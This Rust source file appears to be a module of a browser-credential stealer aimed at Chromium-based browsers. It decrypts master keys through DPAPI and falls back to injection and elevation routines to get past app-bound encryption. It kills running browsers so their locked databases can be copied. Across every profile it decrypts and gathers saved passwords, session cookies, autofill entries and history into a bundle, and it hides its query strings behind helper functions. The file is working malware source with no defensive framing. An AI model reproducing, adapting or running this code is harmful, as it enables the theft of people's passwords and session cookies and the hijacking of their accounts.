use std::{env, fs, path::{Path, PathBuf}};
use rusqlite::{Connection, OpenFlags};
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use crate::encrypted::*;
use crate::dbg_log;

pub struct MasterKeys {
    pub standard: Vec<u8>,
    pub app_bound: Option<Vec<u8>>,
}

pub fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    crate::core::api::dpapi_decrypt_with_entropy(data, entropy, flags)
}

pub fn extract_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
    let os_crypt = s_os_crypt();
    let app_bound_key = s_app_bound_encrypted_key();
    let key_b64 = json[os_crypt][app_bound_key].as_str()?;
    let mut encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
    if encrypted.starts_with(b"APPB") && encrypted.len() > 4 {
        encrypted = encrypted[4..].to_vec();
    }
    Some(encrypted)
}

#[allow(dead_code)]
pub fn extract_raw_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
    let os_crypt = s_os_crypt();
    let app_bound_key = s_app_bound_encrypted_key();
    let key_b64 = json[os_crypt][app_bound_key].as_str()?;
    let encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
    Some(encrypted)
}

pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
    let local_state = user_data_path.join(s_local_state());
    dbg_log!("chr: get_master_keys '{}' local_state={:?} exists={}",
        browser_name, local_state, local_state.exists());
    let content = fs::read_to_string(&local_state).ok()?;
    dbg_log!("chr: '{}' Local State read OK ({} bytes)", browser_name, content.len());
    let json: Value = serde_json::from_str(&content).ok()?;

    let os_crypt = s_os_crypt();
    let encrypted_key = s_encrypted_key();
    let enc_key = match json[&os_crypt][&encrypted_key].as_str() {
        Some(k) => { dbg_log!("chr: '{}' encrypted_key found", browser_name); k }
        None => { dbg_log!("chr: '{}' encrypted_key NOT FOUND in JSON", browser_name); return None; }
    };
    let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
    if decoded.len() < 5 { dbg_log!("chr: '{}' decoded key too short ({})", browser_name, decoded.len()); return None; }

    let standard_wrapped = dpapi_decrypt(&decoded[5..], None, 0);

    let app_bound_key = s_app_bound_encrypted_key();
    let has_app_bound = json[&os_crypt][&app_bound_key].as_str().is_some();
    dbg_log!("chr: '{}' app_bound_key='{}' has_app_bound={}", browser_name, app_bound_key, has_app_bound);

    if let Some(ref s) = standard_wrapped {
        if s.len() == 32 {
            dbg_log!("chr: '{}' DPAPI decrypt OK, using standard master key", browser_name);
            let mut app_bound = if has_app_bound {
                crate::browsers::common::dpf::try_from_local_state(&json)
            } else {
                None
            };
            if app_bound.is_none() && has_app_bound {
                dbg_log!("chr: '{}' dpf failed, trying injection for app_bound", browser_name);
                if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
                    if k.len() == 32 {
                        dbg_log!("chr: '{}' injection app_bound OK (32 bytes)", browser_name);
                        app_bound = Some(k);
                    }
                }
            }
            if app_bound.is_none() && has_app_bound {
                dbg_log!("chr: '{}' injection failed, trying elev for app_bound", browser_name);
                if let Some(raw) = extract_app_bound_from_local_state(&json) {
                    if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
                        if k.len() == 32 {
                            dbg_log!("chr: '{}' elev app_bound OK (32 bytes)", browser_name);
                            app_bound = Some(k);
                        }
                    }
                }
            }
            return Some(MasterKeys { standard: s.clone(), app_bound });
        }
        dbg_log!("chr: '{}' DPAPI decrypt OK but len={} (unexpected)", browser_name, s.len());
    } else {
        dbg_log!("chr: '{}' DPAPI decrypt FAILED", browser_name);
    }

    let local_app_bound = if has_app_bound {
        crate::browsers::common::dpf::try_from_local_state(&json)
    } else {
        None
    };
    if local_app_bound.is_some() {
        dbg_log!("chr: '{}' dpf local app_bound key obtained", browser_name);
    } else {
        dbg_log!("chr: '{}' dpf local app_bound key NOT obtained", browser_name);
    }
    if let (Some(ref wrapped), Some(ref ab)) = (&standard_wrapped, &local_app_bound) {
        if wrapped.len() >= 15 {
            dbg_log!("chr: '{}' trying aead_decrypt unwrap", browser_name);
            if let Some(unwrapped) = aead_decrypt(wrapped, ab) {
                dbg_log!("chr: '{}' successfully unwrapped master key ({} bytes)", browser_name, unwrapped.len());
                return Some(MasterKeys { standard: unwrapped, app_bound: None });
            }
            dbg_log!("chr: '{}' aead_decrypt unwrap FAILED", browser_name);
        }
    }

    if has_app_bound {
        dbg_log!("chr: '{}' trying injection for master key", browser_name);
        if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
            if k.len() == 32 {
                dbg_log!("chr: '{}' injection master key OK (32 bytes)", browser_name);
                return Some(MasterKeys { standard: k, app_bound: None });
            }
            dbg_log!("chr: '{}' injection returned {} bytes", browser_name, k.len());
        }
    }

    if has_app_bound {
        dbg_log!("chr: '{}' trying elev for master key", browser_name);
        if let Some(raw) = extract_app_bound_from_local_state(&json) {
            if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
                if k.len() == 32 {
                    dbg_log!("chr: '{}' elev master key OK (32 bytes)", browser_name);
                    return Some(MasterKeys { standard: k, app_bound: None });
                }
            }
        }
    }

    if let Some(s) = standard_wrapped {
        if !s.is_empty() {
            dbg_log!("chr: '{}' falling back to raw DPAPI blob (len={})", browser_name, s.len());
            return Some(MasterKeys { standard: s, app_bound: local_app_bound });
        }
    }
    if let Some(ab) = local_app_bound {
        return Some(MasterKeys { standard: Vec::new(), app_bound: Some(ab) });
    }
    None
}

fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(iv);
    cipher.decrypt(nonce, ciphertext).ok()
}

fn chacha20_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn aead_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    aes_gcm_decrypt(data, key).or_else(|| chacha20_decrypt(data, key))
}

fn cookie_plaintext(pt: &[u8], is_v20: bool) -> String {
    let data = if is_v20 && pt.len() > 32 { &pt[32..] } else { pt };
    String::from_utf8_lossy(data).into_owned()
}

fn decrypt_cookie_blob(blob: &[u8], keys: &MasterKeys) -> Option<String> {
    if blob.len() < 3 {
        return None;
    }

    let try_decrypt = |key: &[u8]| -> Option<String> {
        aead_decrypt(blob, key).map(|pt| cookie_plaintext(&pt, blob.starts_with(b"v20")))
    };

    if blob.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
    }

    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
    }

    if let Some(dec) = dpapi_decrypt(blob, None, 0) {
        let value = cookie_plaintext(&dec, false);
        if !value.is_empty() {
            return Some(value);
        }
    }

    None
}

fn decrypt_cookie_value(encrypted: &[u8], plain_value: &str, keys: &MasterKeys) -> String {
    if encrypted.is_empty() {
        return plain_value.to_string();
    }

    for skip in [0usize, 32, 1, 3] {
        if encrypted.len() > skip + 3 {
            if let Some(value) = decrypt_cookie_blob(&encrypted[skip..], keys) {
                if !value.is_empty() {
                    return value;
                }
            }
        }
    }

    if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
        let value = cookie_plaintext(&dec, false);
        if !value.is_empty() {
            return value;
        }
    }

    if !plain_value.is_empty() {
        return plain_value.to_string();
    }

    String::new()
}

fn password_plaintext(pt: &[u8], is_v20: bool) -> Option<String> {
    if is_v20 && pt.len() > 32 {
        if let Ok(s) = String::from_utf8(pt[32..].to_vec()) {
            if !s.is_empty() {
                return Some(s);
            }
        }
    }
    String::from_utf8(pt.to_vec()).ok()
}

fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
    if encrypted.is_empty() { return Some(String::new()); }
    if encrypted.len() > 3 && encrypted.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, true) {
                    return Some(s);
                }
            }
        }
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, true) {
                return Some(s);
            }
        }
        if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
            if let Some(s) = password_plaintext(&dec, true) {
                return Some(s);
            }
        }
        return None;
    }
    if encrypted.len() > 3 && (encrypted.starts_with(b"v10") || encrypted.starts_with(b"v11")) {
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, false) {
                return Some(s);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, false) {
                    return Some(s);
                }
            }
        }
        return None;
    }
    dpapi_decrypt(encrypted, None, 0).and_then(|d| String::from_utf8(d).ok())
}

pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() { dbg_log!("chr: copy_db NOT FOUND {:?}", db_path); return None; }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("cr_db_{}.sqlite", nanos));

    let mut last_err = None;
    for attempt in 0..4 {
        match fs::copy(db_path, &temp) {
            Ok(_) => {
                last_err = None;
                break;
            }
            Err(e) => {
                dbg_log!("chr: copy_db attempt {} FAILED {:?} -> {:?}", attempt + 1, db_path, e);
                last_err = Some(e);
                if attempt < 3 {
                    std::thread::sleep(std::time::Duration::from_millis(500 * (attempt + 1) as u64));
                }
            }
        }
    }
    if let Some(e) = last_err {
        dbg_log!("chr: copy_db all attempts failed {:?} -> {:?}", db_path, e);
        return None;
    }

    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in [s_db_wal(), s_db_shm(), s_db_journal()] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            if let Err(e) = fs::copy(&src, &dst) {
                dbg_log!("chr: copy_db suffix COPY FAILED {:?} -> {:?}", suffix, e);
            }
        }
    }
    Some(temp)
}

pub fn open_db_robust(db_path: &Path) -> Option<(Connection, Option<PathBuf>)> {
    for attempt in 0..5 {
        if let Some(temp) = copy_db(db_path) {
            match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| Connection::open(&temp))) {
                Ok(Ok(c)) => return Some((c, Some(temp))),
                Ok(Err(_)) => {
                    cleanup_db(&temp);
                    if attempt < 4 {
                        std::thread::sleep(std::time::Duration::from_millis(1000 * (attempt + 1) as u64));
                    }
                    continue;
                }
                Err(_) => {
                    cleanup_db(&temp);
                    if attempt < 4 {
                        std::thread::sleep(std::time::Duration::from_millis(1000 * (attempt + 1) as u64));
                    }
                    continue;
                }
            }
        }
        if attempt < 4 {
            std::thread::sleep(std::time::Duration::from_millis(1000 * (attempt + 1) as u64));
        }
    }
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        Connection::open_with_flags(
            db_path,
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
        )
    })) {
        Ok(Ok(c)) => Some((c, None)),
        Ok(Err(_)) => None,
        Err(_) => None,
    }
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", &s_db_wal(), &s_db_shm(), &s_db_journal()] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

pub fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let db = profile_path.join(s_login_data());
    let (conn, temp) = match open_db_robust(&db) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let query = s_query_logins();
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut output = String::new();
    let rows = match stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let password: Vec<u8> = row.get(2)?;
        Ok((url, username, password))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    for row in rows.flatten() {
        let (url, username, password_enc) = row;
        if password_enc.is_empty() && username.is_empty() { continue; }
        let version = if password_enc.starts_with(b"v20") { "v20" }
            else if password_enc.starts_with(b"v10") { "v10" }
            else if password_enc.starts_with(b"v11") { "v11" }
            else { "legacy" };
        let password = decrypt_value(&password_enc, keys)
            .unwrap_or_else(|| format!("[encrypted - {}]", version));
        output.push_str(&format!("URL: {}\nUsername: {}\nPassword: {}\n{}\n",
            url, username, password, "-".repeat(50)));
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let network = s_dir_network();
    let cookies = s_file_cookies_db();
    let db_path = if profile_path.join(&network).join(&cookies).exists() {
        profile_path.join(&network).join(&cookies)
    } else {
        profile_path.join(&cookies)
    };
    let (conn, temp) = match open_db_robust(&db_path) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let query = s_query_cookies();
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let rows = match stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let enc_value: Vec<u8> = row.get(2)?;
        let plain_value: String = row.get(3)?;
        let path: String = row.get(4)?;
        let expires: i64 = row.get(5)?;
        let is_secure: i64 = row.get(6)?;
        let is_httponly: i64 = row.get(7)?;
        Ok((host, name, enc_value, plain_value, path, expires, is_secure, is_httponly))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut count = 0;
    let mut body = String::new();
    for row in rows.flatten() {
        let (host, name, enc_value, plain_value, path, expires, is_secure, is_httponly) = row;
        if name.is_empty() {
            continue;
        }
        let value = decrypt_cookie_value(&enc_value, &plain_value, keys);
        let unix_expires = if expires > 0 {
            (expires / 1_000_000) - 11644473600
        } else {
            0
        };
        body.push_str(&crate::browsers::common::nts::format_line(
            &host,
            &path,
            is_secure != 0,
            unix_expires,
            &name,
            &value,
            is_httponly != 0,
        ));
        count += 1;
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if count == 0 {
        None
    } else {
        crate::browsers::common::nts::build_file(&body)
    }
}

pub fn profiles_from_local_state(user_data_path: &Path) -> Vec<(String, PathBuf)> {
    let local_state = user_data_path.join(s_local_state());
    let content = match fs::read_to_string(&local_state) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let json: Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    let info_cache = s_profile_info_cache();
    if let Some(cache) = json.pointer(&info_cache).and_then(|v| v.as_object()) {
        for name in cache.keys() {
            if name == "System Profile" {
                continue;
            }
            let path = user_data_path.join(name);
            if path.is_dir() {
                profiles.push((name.clone(), path));
            }
        }
    }

    profiles.sort_by(|a, b| {
        profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0))
    });
    profiles
}

fn profile_sort_key(name: &str) -> (u8, u32, String) {
    if name == "Default" {
        return (0, 0, String::new());
    }
    if name == "Guest Profile" {
        return (2, 0, String::new());
    }
    if let Some(n) = name.strip_prefix("Profile ") {
        if let Ok(num) = n.parse::<u32>() {
            return (1, num, String::new());
        }
    }
    (1, u32::MAX, name.to_lowercase())
}

pub fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, PathBuf)> {
    if !has_profiles {
        if user_data_path.exists() {
            return vec![("Default".to_string(), user_data_path.to_path_buf())];
        }
        return Vec::new();
    }

    let mut profiles = profiles_from_local_state(user_data_path);
    let mut seen: std::collections::HashSet<String> = profiles.iter().map(|(n, _)| n.clone()).collect();

    if let Ok(entries) = fs::read_dir(user_data_path) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            if name == "System Profile" || name.starts_with('.') {
                continue;
            }
            let is_profile = name == "Default"
                || name == "Guest Profile"
                || name.starts_with("Profile ")
                || entry.path().join(s_file_preferences()).exists()
                || entry.path().join(&s_dir_network()).join(&s_file_cookies_db()).exists()
                || entry.path().join(&s_file_cookies_db()).exists();
            if is_profile && seen.insert(name.clone()) {
                profiles.push((name, entry.path()));
            }
        }
    }

    profiles.sort_by(|a, b| profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0)));
    profiles
}

pub fn extract_autofill(profile_path: &Path) -> Option<String> {
    let db = profile_path.join(s_web_data());
    let (conn, temp) = match open_db_robust(&db) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let mut stmt = match conn.prepare(&s_query_autofill()) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut output = String::new();
    let rows = match stmt.query_map([], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        Ok((name, value, count))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!("Name: {}\nValue: {}\nCount: {}\n{}\n",
            name, value, count, "-".repeat(50)));
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_history(profile_path: &Path) -> Option<String> {
    let db = profile_path.join(s_history_db());
    let (conn, temp) = match open_db_robust(&db) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let mut stmt = match conn.prepare(&s_query_history()) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut output = String::new();
    let rows = match stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visit_count: i64 = row.get(2)?;
        let last_visit: i64 = row.get(3)?;
        Ok((url, title, visit_count, last_visit))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!("URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url, title, visit_count, last_visit, "-".repeat(50)));
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) -> Vec<(String, String)> {
    std::thread::sleep(std::time::Duration::from_millis(1000));
    let mut results = Vec::new();
    if !user_data_path.exists() {
        return results;
    }
    let keys = get_master_keys(user_data_path, browser_name);
    crate::core::kill::kill_browsers();
    std::thread::sleep(std::time::Duration::from_millis(500));
    let keys_ref_opt = keys.as_ref();
    let profiles = get_profiles(user_data_path, has_profiles);
    for (profile_name, profile_path) in profiles {
        let passwords = if let Some(keys_ref) = keys_ref_opt {
            extract_passwords(&profile_path, keys_ref)
        } else {
            None
        };
        let dummy_keys = MasterKeys { standard: Vec::new(), app_bound: None };
        let cookies = extract_cookies(&profile_path, keys_ref_opt.unwrap_or(&dummy_keys));
        let autofill = extract_autofill(&profile_path);
        let history = extract_history(&profile_path);

        crate::browsers::common::zipp::push_profile_bundle(
            &mut results,
            browser_name,
            &profile_name,
            passwords,
            cookies,
            autofill,
            history,
        );
    }
    results
}
